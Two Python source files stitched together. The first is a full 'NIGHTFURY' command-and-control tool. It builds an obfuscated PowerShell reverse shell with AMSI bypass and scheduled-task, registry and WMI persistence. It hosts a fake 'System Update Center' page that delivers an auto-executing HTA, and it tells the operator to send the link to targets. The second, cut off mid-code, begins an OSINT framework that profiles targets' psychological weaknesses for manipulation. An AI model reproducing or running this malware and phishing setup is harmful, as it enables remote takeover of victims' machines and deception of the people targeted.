#!/usr/bin/env python3
"""
Project NIGHTFURY - Elite Stealth Edition
Author: Cyber Sentinel
Version: 5.0
Description: Advanced stealth C2 framework with auto-configuration
"""

import os
import sys
import base64
import random
import string
import socket
import threading
import time
import requests
import json
import discord
from discord.ext import commands
import asyncio
import subprocess
import uuid
import re
import logging
import qrcode
import io
import secrets
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QTabWidget, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QLineEdit, QPushButton, QTextEdit, QCheckBox, QGroupBox,
    QComboBox, QListWidget, QListWidgetItem, QProgressBar, QMessageBox,
    QFileDialog, QSplitter, QFormLayout, QSizePolicy, QStatusBar
)
from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
from PyQt5.QtGui import QFont, QPalette, QColor, QIcon

# Configure logging to be more stealthy
logging.basicConfig(
    level=logging.ERROR,  # Only log errors to reduce footprint
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("system_health.log"),  # Use innocent filename
        logging.NullHandler()  # Add null handler to reduce logs
    ]
)
logger = logging.getLogger("SystemHealth")

# ==============================
# AUTO-CONFIGURATION SYSTEM
# ==============================

class AutoConfig:
    def __init__(self):
        self.config_file = "system_config.json"
        self.default_config = {
            'lhost': 'auto',
            'lport': 443,  # Use HTTPS port for stealth
            'obfuscation_level': 5,
            'persistence': True,
            'discord_token': "",
            'auto_server_port': 80,  # Use HTTP port for compatibility
            'domain': "update-system.com",  # Benign-looking domain
            'stealth_level': 'max',
            'use_https': False,
            'jitter': 5,
            'retries': 10
        }
    
    def detect_public_ip(self):
        """Get public IP using multiple services for reliability"""
        services = [
            'https://api.ipify.org',
            'https://ident.me',
            'https://checkip.amazonaws.com'
        ]
        
        for service in services:
            try:
                ip = requests.get(service, timeout=5).text.strip()
                if ip and not ip.startswith("10.") and not ip.startswith("192.168"):
                    return ip
            except:
                continue
        return "127.0.0.1"
    
    def generate_domain(self):
        """Generate a random benign-looking domain"""
        prefixes = ['update', 'software', 'download', 'install', 'service']
        suffixes = ['system', 'center', 'cloud', 'online', 'network']
        tlds = ['.com', '.net', '.org', '.info']
        
        return f"{random.choice(prefixes)}-{random.choice(suffixs)}{random.choice(tlds)}"
    
    def load_config(self):
        """Load or create configuration"""
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    # Update with any new default settings
                    for key, value in self.default_config.items():
                        if key not in config:
                            config[key] = value
                    return config
            except:
                pass
        
        # Create new config with automated settings
        config = self.default_config.copy()
        config['lhost'] = self.detect_public_ip()
        config['domain'] = self.generate_domain()
        
        # Save config
        self.save_config(config)
        return config
    
    def save_config(self, config):
        """Save configuration to file"""
        with open(self.config_file, 'w') as f:
            json.dump(config, f, indent=2)
    
    def setup_complete(self):
        """Check if setup is complete"""
        return os.path.exists(self.config_file)

# ==============================
# STEALTH PAYLOAD ENGINE
# ==============================

class StealthPayload:
    def __init__(self, config):
        self.config = config
        self.payload = None
        self.payload_id = str(uuid.uuid4())[:8]
    
    def _generate_key(self, length=32):
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    
    def _xor_encrypt(self, payload):
        key = self._generate_key()
        encrypted = bytearray()
        for i in range(len(payload)):
            encrypted.append(payload[i] ^ ord(key[i % len(key)]))
        return base64.b64encode(encrypted).decode(), key
    
    def _add_amsi_bypass(self, payload):
        # Multiple AMSI bypass techniques
        bypass_code = '''
        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);
        [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').SetValue($null, @{});
        # Additional bypass techniques
        $a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};$g=$f.GetValue($null);[IntPtr]$h=$g;[Int32[]]$i=@(0);[System.Runtime.InteropServices.Marshal]::Copy($i,0,$h,1);
        '''
        return bypass_code + payload
    
    def _add_stealth_measures(self, payload):
        # Add jitter, retries, and other stealth measures
        stealth_code = f'''
        $jitter = {self.config['jitter']};
        $retries = {self.config['retries']};
        $current_try = 0;
        
        while($current_try -lt $retries) {{
            try {{
                # Add random delay
                $delay = (Get-Random -Minimum 1 -Maximum ($jitter * 1000));
                Start-Sleep -Milliseconds $delay;
        '''
        
        return stealth_code + payload + '''
            } catch {
                $current_try++;
                if ($current_try -ge $retries) {
                    break;
                }
                # Exponential backoff
                $backoff = [math]::Pow(2, $current_try);
                Start-Sleep -Seconds $backoff;
            }
        }
        '''
    
    def _add_persistence(self, payload):
        # Multiple persistence mechanisms
        persistence_code = f'''
        # Scheduled Task
        $taskName = "WindowsSystemHealth_{0}";
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -Command `"{1}`"";
        $trigger = New-ScheduledTaskTrigger -AtLogOn;
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\\$env:USERNAME" -LogonType Interactive;
        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew;
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null;

        # Registry Persistence
        $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
        $regName = "SystemHealthMonitor";
        $regValue = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"{1}`"";
        Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force;

        # WMI Event Subscription
        $filterArgs = @{{Name="SystemHealthFilter"; EventNameSpace="root\\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process'"}};
        $filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments $filterArgs;
        $consumerArgs = @{{Name="SystemHealthConsumer"; CommandLineTemplate="powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"{1}`""}};
        $consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs;
        Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{Filter=$filter; Consumer=$consumer}} | Out-Null;
        '''.format(self.payload_id, payload.replace('"', '`"'))
        
        return persistence_code
    
    def _obfuscate_vars(self, payload):
        # Enhanced obfuscation with more variable replacements
        var_map = {}
        for i in range(20):  # Replace more variables
            var_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(3))
            var_map[var_name] = self._generate_key(8)
        
        for orig, new in var_map.items():
            payload = payload.replace(f'${orig}', f'${new}')
        
        return payload
    
    def _insert_junk_code(self, payload):
        # More realistic junk code
        junk_ops = [
            "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;",
            "$null = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');",
            "$junkVar = [System.Guid]::NewGuid().ToString();",
            "Start-Sleep -Milliseconds (Get-Random -Minimum 10 -Maximum 100);",
            "[System.Diagnostics.Process]::GetCurrentProcess().PriorityClass = [System.Diagnostics.ProcessPriorityClass]::BelowNormal;",
            "Add-Type -AssemblyName System.Web; $web = New-Object System.Web.HttpUtility;",
            "[System.Environment]::SetEnvironmentVariable('TEMP_VAR', [System.Guid]::NewGuid().ToString(), 'Process');"
        ]
        
        lines = payload.split(';')
        new_lines = []
        for line in lines:
            if line.strip() and random.random() > 0.6:  # More junk code
                junk = random.choice(junk_ops)
                new_lines.append(junk)
            new_lines.append(line)
        
        return ';'.join(new_lines)
    
    def generate(self):
        # PowerShell reverse shell with enhanced stealth
        protocol = "https" if self.config['use_https'] else "http"
        ps_code = f'''
        # Main payload execution
        while($true) {{
            try {{
                $client = New-Object System.Net.Sockets.TCPClient("{self.config['lhost']}",{self.config['lport']});
                $stream = $client.GetStream();
                [byte[]]$bytes = 0..65535|%{{0}};
                
                while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
                    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
                    $sendback = (iex $data 2>&1 | Out-String );
                    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
                    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
                    $stream.Write($sendbyte,0,$sendbyte.Length);
                    $stream.Flush();
                }}
                $client.Close();
            }} catch {{
                # Silent error handling
                Start-Sleep -Seconds (Get-Random -Minimum 30 -Maximum 300);
            }}
        }}
        '''
        
        # Add AMSI bypass
        ps_code = self._add_amsi_bypass(ps_code)
        
        # Apply obfuscation layers based on config
        for _ in range(self.config['obfuscation_level']):
            encrypted, key = self._xor_encrypt(ps_code.encode())
            ps_code = f'''
            $k = "{key}";
            $s = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("{encrypted}"));
            $r = '';
            0..($s.Length-1)|%{{$r += [char]($s[$_] -bxor $k[$_ % $k.Length])}};
            iex $r
            '''
            # Randomize variable names
            ps_code = self._obfuscate_vars(ps_code)
            # Insert junk code
            ps_code = self._insert_junk_code(ps_code)
        
        # Add stealth measures
        ps_code = self._add_stealth_measures(ps_code)
        
        # Add persistence if requested
        if self.config['persistence']:
            ps_code = self._add_persistence(ps_code)
        
        # Final payload formatting
        self.payload = f"powershell -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command \"{ps_code}\""
        return self.payload
    
    def generate_hta(self):
        if not self.payload:
            self.generate()
        
        # Create HTA file that auto-executes the payload
        hta_content = f"""
        <html>
        <head>
        <title>System Update Center</title>
        <HTA:APPLICATION ID="SystemUpdate" APPLICATIONNAME="System Update" SCROLL="no" SINGLEINSTANCE="yes" WINDOWSTATE="minimize">
        <script language="VBScript">
            Sub Window_OnLoad
                On Error Resume Next
                Set objShell = CreateObject("Wscript.Shell")
                objShell.Run "{self.payload.replace('"', '""')}", 0, False
                window.setTimeout "Self.Close", 1000
            End Sub
        </script>
        </head>
        <body>
        <div style="font-family: Arial; text-align: center; padding: 50px;">
            <h1>Installing System Updates...</h1>
            <p>Please wait while we install important system updates.</p>
        </div>
        </body>
        </html>
        """
        return hta_content

# ==============================
# STEALTH AUTO-EXECUTION SERVER
# ==============================

class StealthServer(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Disable default logging to be more stealthy
        return
    
    def do_GET(self):
        parsed_path = urlparse(self.path)
        query = parse_qs(parsed_path.query)
        
        # Check for trigger parameter
        if parsed_path.path == "/update":
            # Send auto-execute HTA file
            self.send_response(200)
            self.send_header('Content-Type', 'application/hta')
            self.send_header('Content-Disposition', 'attachment; filename="system_update.hta"')
            self.end_headers()
            
            # Generate HTA payload
            payload = StealthPayload(self.server.config)
            hta_content = payload.generate_hta()
            self.wfile.write(hta_content.encode())
            return
        
        # Serve a decoy page
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # Serve decoy page
        html_content = """
        <html>
        <head>
            <title>System Update Center</title>
            <style>
                body { font-family: Arial, sans-serif; background: #f0f0f0; color: #333; text-align: center; padding: 20px; }
                .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
                h1 { color: #0078D7; }
                .button { background: #0078D7; color: white; padding: 15px 30px; font-size: 16px; border: none; border-radius: 5px; cursor: pointer; }
                .button:hover { background: #106EBE; }
                .footer { margin-top: 30px; font-size: 12px; color: #666; }
            </style>
            <script>
                function startUpdate() {
                    // Create iframe to trigger download without leaving page
                    var iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = '/update';
                    document.body.appendChild(iframe);
                    
                    // Show processing message
                    document.getElementById('processing').style.display = 'block';
                    document.getElementById('update-button').style.display = 'none';
                }
            </script>
        </head>
        <body>
            <div class="container">
                <h1>System Update Center</h1>
                <p>Your system requires important updates for optimal performance and security.</p>
                <p>Click the button below to download and install the updates.</p>
                
                <button id="update-button" class="button" onclick="startUpdate()">Install Updates Now</button>
                
                <div id="processing" style="display: none;">
                    <h2>Installing Updates...</h2>
                    <p>Please wait while we download and install the updates. Do not close this window.</p>
                    <div style="margin: 20px auto; width: 50px; height: 50px; border: 5px solid #f3f3f3; 
                                border-top: 5px solid #0078D7; border-radius: 50%; animation: spin 2s linear infinite;"></div>
                    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                </div>
                
                <div class="footer">
                    <p>This is a secure system provided by your organization.</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        self.wfile.write(html_content.encode())

# ==============================
# SIMPLIFIED GUI APPLICATION
# ==============================

class NightfuryEliteGUI(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("System Health Monitor")
        self.setGeometry(100, 100, 1000, 700)
        
        # Initialize auto-configuration
        self.config_manager = AutoConfig()
        self.config = self.config_manager.load_config()
        
        self.current_payload = None
        self.listener_thread = None
        self.http_server = None
        self.discord_bot = None
        self.active_connections = []
        
        # Create main tabs
        self.tabs = QTabWidget()
        self.setCentralWidget(self.tabs)
        
        # Create simplified tabs
        self.create_dashboard_tab()
        self.create_settings_tab()
        
        # Create status bar
        self.status_bar = QStatusBar()
        self.setStatusBar(self.status_bar)
        self.status_bar.showMessage("✅ System Ready")
        
        # Apply system theme
        self.apply_system_theme()
        
        # Setup connection monitor
        self.connection_monitor = QTimer()
        self.connection_monitor.timeout.connect(self.update_connection_status)
        self.connection_monitor.start(1000)
        
        # Auto-start services if configured
        if self.config['auto_start']:
            QTimer.singleShot(2000, self.auto_start_services)
    
    def apply_system_theme(self):
        # Use system theme for better stealth
        self.setStyleSheet("""
            QMainWindow {
                background-color: #F0F0F0;
            }
            QTabWidget::pane {
                border: 1px solid #CCCCCC;
                background: white;
            }
            QTabBar::tab {
                background: #E0E0E0;
                color: #333333;
                padding: 8px;
                border: 1px solid #CCCCCC;
                border-bottom: none;
                border-top-left-radius: 4px;
                border-top-right-radius: 4px;
            }
            QTabBar::tab:selected {
                background: white;
                color: #0078D7;
            }
            QGroupBox {
                border: 1px solid #CCCCCC;
                border-radius: 4px;
                margin-top: 1ex;
                font-weight: bold;
                color: #333333;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px 0 5px;
                color: #333333;
            }
            QPushButton {
                background-color: #0078D7;
                color: white;
                border: none;
                border-radius: 4px;
                padding: 8px 16px;
                min-height: 30px;
            }
            QPushButton:hover {
                background-color: #106EBE;
            }
            QPushButton:disabled {
                background-color: #CCCCCC;
            }
            QLineEdit, QTextEdit, QListWidget {
                border: 1px solid #CCCCCC;
                border-radius: 4px;
                padding: 5px;
                background: white;
            }
        """)
    
    def create_dashboard_tab(self):
        dashboard_tab = QWidget()
        layout = QVBoxLayout()
        dashboard_tab.setLayout(layout)
        self.tabs.addTab(dashboard_tab, "Dashboard")
        
        # Status panel
        status_group = QGroupBox("System Status")
        status_layout = QVBoxLayout()
        
        self.status_label = QLabel("✅ All systems operational")
        status_layout.addWidget(self.status_label)
        
        self.connections_label = QLabel("Active connections: 0")
        status_layout.addWidget(self.connections_label)
        
        status_group.setLayout(status_layout)
        layout.addWidget(status_group)
        
        # Quick actions
        actions_group = QGroupBox("Quick Actions")
        actions_layout = QHBoxLayout()
        
        self.start_btn = QPushButton("Start Services")
        self.start_btn.clicked.connect(self.start_all_services)
        actions_layout.addWidget(self.start_btn)
        
        self.stop_btn = QPushButton("Stop Services")
        self.stop_btn.clicked.connect(self.stop_all_services)
        self.stop_btn.setEnabled(False)
        actions_layout.addWidget(self.stop_btn)
        
        self.generate_btn = QPushButton("Generate Payload")
        self.generate_btn.clicked.connect(self.generate_payload)
        actions_layout.addWidget(self.generate_btn)
        
        actions_group.setLayout(actions_layout)
        layout.addWidget(actions_group)
        
        # Connection monitor
        monitor_group = QGroupBox("Connection Monitor")
        monitor_layout = QVBoxLayout()
        
        self.connections_list = QListWidget()
        monitor_layout.addWidget(self.connections_list)
        
        monitor_group.setLayout(monitor_layout)
        layout.addWidget(monitor_group)
    
    def create_settings_tab(self):
        settings_tab = QWidget()
        layout = QVBoxLayout()
        settings_tab.setLayout(layout)
        self.tabs.addTab(settings_tab, "Settings")
        
        # Network settings
        network_group = QGroupBox("Network Settings")
        network_layout = QFormLayout()
        
        self.lhost_input = QLineEdit(self.config['lhost'])
        network_layout.addRow("Listener Host:", self.lhost_input)
        
        self.lport_input = QLineEdit(str(self.config['lport']))
        network_layout.addRow("Listener Port:", self.lport_input)
        
        self.server_port_input = QLineEdit(str(self.config['auto_server_port']))
        network_layout.addRow("Server Port:", self.server_port_input)
        
        network_group.setLayout(network_layout)
        layout.addWidget(network_group)
        
        # Stealth settings
        stealth_group = QGroupBox("Stealth Settings")
        stealth_layout = QFormLayout()
        
        self.obf_level = QComboBox()
        self.obf_level.addItems(["1 (Low)", "2", "3", "4", "5 (Maximum)"])
        self.obf_level.setCurrentIndex(self.config['obfuscation_level'] - 1)
        stealth_layout.addRow("Obfuscation Level:", self.obf_level)
        
        self.stealth_level = QComboBox()
        self.stealth_level.addItems(["Low", "Medium", "High", "Maximum"])
        self.stealth_level.setCurrentIndex(["low", "medium", "high", "max"].index(self.config['stealth_level']))
        stealth_layout.addRow("Stealth Level:", self.stealth_level)
        
        self.persistence_cb = QCheckBox("Enable Persistence")
        self.persistence_cb.setChecked(self.config['persistence'])
        stealth_layout.addRow(self.persistence_cb)
        
        self.auto_start_cb = QCheckBox("Auto-start Services")
        self.auto_start_cb.setChecked(self.config.get('auto_start', False))
        stealth_layout.addRow(self.auto_start_cb)
        
        stealth_group.setLayout(stealth_layout)
        layout.addWidget(stealth_group)
        
        # Save button
        save_btn = QPushButton("Save Settings")
        save_btn.clicked.connect(self.save_settings)
        layout.addWidget(save_btn)
    
    def save_settings(self):
        try:
            self.config['lhost'] = self.lhost_input.text()
            self.config['lport'] = int(self.lport_input.text())
            self.config['auto_server_port'] = int(self.server_port_input.text())
            self.config['obfuscation_level'] = self.obf_level.currentIndex() + 1
            self.config['stealth_level'] = ["low", "medium", "high", "max"][self.stealth_level.currentIndex()]
            self.config['persistence'] = self.persistence_cb.isChecked()
            self.config['auto_start'] = self.auto_start_cb.isChecked()
            
            self.config_manager.save_config(self.config)
            self.status_bar.showMessage("✅ Settings saved", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def generate_payload(self):
        try:
            payload = StealthPayload(self.config)
            self.current_payload = payload.generate()
            
            # Save to file
            filename = f"system_update_{int(time.time())}.bat"
            with open(filename, "w") as f:
                f.write("@echo off\n")
                f.write("REM Windows System Update Utility\n")
                f.write(self.current_payload)
            
            self.status_bar.showMessage(f"✅ Payload saved as {filename}", 5000)
            
            # Show quick guide
            QMessageBox.information(self, "Payload Generated", 
                f"Payload has been saved as {filename}\n\n"
                "To use:\n"
                "1. Host the file on your server\n"
                "2. Send the link to targets\n"
                "3. Start the listener from the Dashboard tab")
                
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error: {str(e)}", 5000)
    
    def start_all_services(self):
        self.start_listener()
        self.start_auto_server()
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        self.status_bar.showMessage("✅ All services started", 5000)
    
    def stop_all_services(self):
        self.stop_listener()
        self.stop_auto_server()
        self.stop_discord_bot()
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_bar.showMessage("✅ All services stopped", 5000)
    
    def auto_start_services(self):
        if self.config.get('auto_start', False):
            self.start_all_services()
    
    def start_listener(self):
        try:
            # Create listener socket
            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener_socket.bind((self.config['lhost'], self.config['lport']))
            self.listener_socket.listen(5)
            
            # Start listener thread
            self.listener_thread = threading.Thread(target=self.listen_for_connections, daemon=True)
            self.listener_thread.start()
            
            self.status_label.setText("🟢 Listener active on {}:{}".format(
                self.config['lhost'], self.config['lport']))
            self.status_bar.showMessage("✅ Listener started", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Listener error: {str(e)}", 5000)
    
    def listen_for_connections(self):
        while True:
            try:
                client_socket, addr = self.listener_socket.accept()
                ip, port = addr
                
                # Add to active connections
                self.active_connections.append({
                    'socket': client_socket,
                    'address': f"{ip}:{port}",
                    'active': True
                })
                
                # Update UI
                self.connections_list.addItem(f"{ip}:{port}")
                self.connections_label.setText(f"Active connections: {len(self.active_connections)}")
                
                # Start client handler
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, f"{ip}:{port}"),
                    daemon=True
                )
                client_thread.start()
            except:
                break
    
    def handle_client(self, client_socket, client_id):
        try:
            # Send initial prompt
            client_socket.send(b"PS C:\\> ")
            
            while True:
                data = client_socket.recv(4096)
                if not data:
                    break
                
                # Log command execution
                cmd = data.decode().strip()
                if cmd.lower() == "exit":
                    break
                
                # Execute command
                try:
                    result = subprocess.run(
                        cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    output = result.stdout + result.stderr
                    output += f"\nPS {os.getcwd()}> "
                except Exception as e:
                    output = f"Error: {str(e)}\nPS {os.getcwd()}> "
                
                client_socket.send(output.encode())
        except:
            pass
        
        # Remove connection
        for i, conn in enumerate(self.active_connections):
            if conn['address'] == client_id:
                self.active_connections.pop(i)
                break
        
        # Remove from UI
        items = self.connections_list.findItems(client_id, Qt.MatchExactly)
        for item in items:
            row = self.connections_list.row(item)
            self.connections_list.takeItem(row)
        
        self.connections_label.setText(f"Active connections: {len(self.active_connections)}")
        client_socket.close()
    
    def stop_listener(self):
        try:
            # Close all client sockets
            for conn in self.active_connections:
                try:
                    conn['socket'].close()
                except:
                    pass
            
            # Close listener socket
            self.listener_socket.close()
            self.active_connections = []
            
            # Update UI
            self.connections_list.clear()
            self.connections_label.setText("Active connections: 0")
            self.status_label.setText("✅ All systems operational")
            
            self.status_bar.showMessage("✅ Listener stopped", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error stopping listener: {str(e)}", 5000)
    
    def start_auto_server(self):
        try:
            # Create HTTP server
            server_address = ('', self.config['auto_server_port'])
            
            # Create a custom handler class with our config
            class CustomHandler(StealthServer):
                pass
                
            setattr(CustomHandler, 'server', self)
            setattr(CustomHandler, 'config', self.config)
            
            self.http_server = HTTPServer(server_address, CustomHandler)
            self.http_server.is_running = True
            
            # Start server in a separate thread
            server_thread = threading.Thread(target=self.http_server.serve_forever, daemon=True)
            server_thread.start()
            
            self.status_bar.showMessage(f"✅ Server started on port {self.config['auto_server_port']}", 5000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Server error: {str(e)}", 5000)
    
    def stop_auto_server(self):
        try:
            if self.http_server:
                self.http_server.shutdown()
                self.http_server.server_close()
                self.status_bar.showMessage("✅ Server stopped", 3000)
        except Exception as e:
            self.status_bar.showMessage(f"❌ Error stopping server: {str(e)}", 5000)
    
    def update_connection_status(self):
        # Update connection count in status bar
        connection_count = len(self.active_connections)
        status = f"✅ System Ready | Connections: {connection_count}"
        if hasattr(self, 'http_server') and self.http_server and self.http_server.is_running:
            status += " | Server: Running"
        self.status_bar.showMessage(status)

# ==============
# MAIN EXECUTION
# ==============

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    
    # Set application font
    font = QFont("Segoe UI", 9)
    app.setFont(font)
    
    window = NightfuryEliteGUI()
    window.show()
    sys.exit(app.exec_())
#!/usr/bin/env python3
"""
OMNIFRAME - Enterprise-Grade OSINT & Penetration Testing Framework
Integrated system combining Damienz Domain, OSINT Fusion, AEGIS, and visualization capabilities
"""

import os
import sys
import json
import logging
import asyncio
import threading
import importlib
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Any, Optional, Callable

# Configuration management
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

# Attempt to import all potential dependencies
try:
    import requests
    import numpy as np
    import pandas as pd
    import dns.resolver
    from bs4 import BeautifulSoup
    import questionary
    from questionary import Style
    import aiodns
    import nmap
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.chrome.options import Options
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.cluster import DBSCAN
    import networkx as nx
    import matplotlib.pyplot as plt
    DEPENDENCIES_AVAILABLE = True
except ImportError as e:
    print(f"Missing dependencies: {e}")
    DEPENDENCIES_AVAILABLE = False

# Try to import GUI components
GUI_AVAILABLE = False
try:
    import tkinter as tk
    from tkinter import ttk, scrolledtext, filedialog, messagebox
    from PIL import Image, ImageTk
    GUI_AVAILABLE = True
except ImportError:
    pass

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("omniframe_operations.log"),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("OmniFrame")

class ConfigManager:
    """Secure configuration management for the framework"""
    
    def __init__(self, config_dir=".omniframe"):
        self.config_dir = Path.home() / config_dir
        self.config_file = self.config_dir / "config.encrypted"
        self.key_file = self.config_dir / "key.encrypted"
        self.ensure_directories()
        
        # Default configuration
        self.default_config = {
            "version": "1.0.0",
            "modules": {
                "enabled": ["damienz_domain", "osint_fusion", "aegis_osint", "visualization"],
                "damienz_domain": {
                    "aggressiveness": "normal",
                    "timeout": 30,
                    "ports": "1-1000"
                },
                "osint_fusion": {
                    "max_workers": 50,
                    "request_timeout": 30
                },
                "aegis_osint": {
                    "targets_dir": "targets",
                    "wordlists_dir": "wordlists"
                }
            },
            "security": {
                "encryption_enabled": True,
                "auto_update": True,
                "secure_deletion": False
            },
            "api_keys": {
                "shodan": "",
                "hunterio": "",
                "virustotal": "",
                "facebook": "",
                "twitter": ""
            },
            "psychological_profiles": {
                "exploitation_threshold": 0.7,
                "behavioral_patterns": ["fear_response", "curiosity", "trust_vulnerability"],
                "manipulation_techniques": ["authority", "urgency", "social_proof"]
            }
        }
        
        self.config = self.load_config()
    
    def ensure_directories(self):
        """Ensure all necessary directories exist"""
        self.config_dir.mkdir(exist_ok=True, parents=True)
        (self.config_dir / "data").mkdir(exist_ok=True)
        (self.config_dir / "reports").mkdir(exist_ok=True)
        (self.config_dir / "modules").mkdir(exist_ok=True)
        (self.config_dir / "exports").mkdir(exist_ok=True)
    
    def generate_key(self):
        """Generate a new encryption key"""
        return Fernet.generate_key()
    
    def load_key(self):
        """Load or create encryption key"""
        if self.key_file.exists():
            with open(self.key_file, 'rb') as f:
                return f.read()
        else:
            key = self.generate_key()
            with open(self.key_file, 'wb') as f:
                f.write(key)
            return key
    
    def encrypt_data(self, data: str) -> bytes:
        """Encrypt configuration data"""
        key = self.load_key()
        fernet = Fernet(key)
        return fernet.encrypt(data.encode())
    
    def decrypt_data(self, encrypted_data: bytes) -> str:
        """Decrypt configuration data"""
        key = self.load_key()
        fernet = Fernet(key)
        return fernet.decrypt(encrypted_data).decode()
    
    def load_config(self) -> Dict:
        """Load configuration from encrypted file"""
        if self.config_file.exists():
            try:
                with open(self.config_file, 'rb') as f:
                    encrypted_data = f.read()
                decrypted_data = self.decrypt_data(encrypted_data)
                return json.loads(decrypted_data)
            except Exception as e:
                logger.error(f"Error loading config: {e}")
                return self.default_config
        else:
            return self.default_config
    
    def save_config(self):
        """Save configuration to encrypted file"""
        try:
            config_json = json.dumps(self.config, indent=2)
            encrypted_data = self.encrypt_data(config_json)
            with open(self.config_file, 'wb') as f:
                f.write(encrypted_data)
            return True
        except Exception as e:
            logger.error(f"Error saving config: {e}")
            return False
    
    def get_api_key(self, service: str) -> Optional[str]:
        """Get API key for a service"""
        return self.config['api_keys'].get(service, None)
    
    def update_api_key(self, service: str, key: str):
        """Update API key for a service"""
        self.config['api_keys'][service] = key
        self.save_config()

class PsychologicalProfiler:
    """Advanced psychological profiling for target analysis"""
    
    def __init__(self, config: ConfigManager):
        self.config = config
        self.behavioral_patterns = self.load_behavioral_patterns()
        self.manipulation_techniques = self.load_manipulation_techniques()
    
    def load_behavioral_patterns(self) -> Dict:
        """Load behavioral patterns database"""
        patterns = {
            "fear_response": {
                "indicators": ["rapid decision making", "avoidance behavior", "heightened sensitivity"],
                "exploitation_methods": ["create urgency", "invoke loss aversion", "threat modeling"],
                "effectiveness": 0.85
            },
            "curiosity": {
                "indicators": ["information seeking", "questioning behavior", "exploratory actions"],
                "exploitation_methods": ["information gap creation", "mystery building", "progressive disclosure"],
                "effectiveness": 0.75
            },
            "trust_vulnerability": {
                "indicators": ["acceptance of authority", "low skepticism", "compliance with requests"],
                "exploitation_methods": ["authority assertion", "social proof", "likability building"],
                "effectiveness": 0.90
            },
            "social_conformity": {
                "indicators": ["group following", "opinion alignment", "normative behavior"],
                "exploitation_methods": ["social proof", "group consensus", "normative influence"],
                "effectiveness": 0.80
            }
        }
        return patterns
    
    def load_manipulation_techniques(self) -> Dict:
        """Load manipulation techniques database"""
        techniques = {
            "authority": {
                "description": "Using perceived authority to influence behavior",
                "implementation": "Present as expert, use credentials, authoritative language",
                "success_rate": 0.82
            },
            "urgency": {
